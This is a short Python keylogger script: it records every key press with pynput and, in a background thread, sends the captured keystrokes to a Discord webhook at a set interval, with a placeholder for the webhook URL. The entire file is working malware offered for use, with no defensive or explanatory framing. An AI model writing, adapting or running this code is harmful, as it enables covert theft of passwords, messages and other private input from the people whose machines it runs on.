from pynput.keyboard import Key, Listener
from discord_webhook import DiscordWebhook
import time
import threading

keystrokes=""
WEBHOOK="Your_Discord_WebHook"
INTERVAL = 10 # in seconds change if you want


def on_press(key):
	global keystrokes
	keystrokes+="\n"+str(key)


def send_keystrokes():
	# send colected keystrokes to discord for every interval
	global keystrokes

	while(1):
		if keystrokes=="":
			continue
		#send to discord webhook
		webhook = DiscordWebhook(url=WEBHOOK,content=keystrokes)
		response = webhook.execute()
		print("SENT")
		keystrokes=""
		time.sleep(INTERVAL)


if __name__ == "__main__":
	x = threading.Thread(target=send_keystrokes,args=())
	x.daemon=True
	x.start()

	with Listener(on_press=on_press) as listener:
		listener.join()